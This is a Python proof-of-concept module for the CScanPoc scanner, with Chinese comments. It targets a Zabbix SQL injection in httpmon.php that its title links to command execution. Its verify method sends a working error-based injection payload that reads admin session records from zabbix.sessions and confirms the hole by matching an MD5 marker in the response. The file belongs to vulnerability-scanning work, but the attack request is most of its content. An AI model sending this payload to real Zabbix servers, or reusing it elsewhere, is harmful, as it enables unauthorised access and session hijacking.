# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Zabbix_0008' # 平台漏洞编号，留空
    name = '极光推送之zabbix注入导致命令执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-11-28'  # 漏洞公布时间
    desc = '''
        极光推送之zabbix注入导致命令执行
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=084877' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'zabbix'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ce78bb70-5afe-43c0-b7e0-9c4137259ebf'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28md5('123'),0x7e,userid,0x7e,status%29%20as%20char%29,0x7e%29%29%20from%20zabbix.sessions%20where%20status=0%20and%20userid=1%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29"
            code, head, res, errcode, _ = hh.http(arg + payload)
            if code == 200:
                m = re.search("202cb962ac59075b964b07152d234b70",res)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()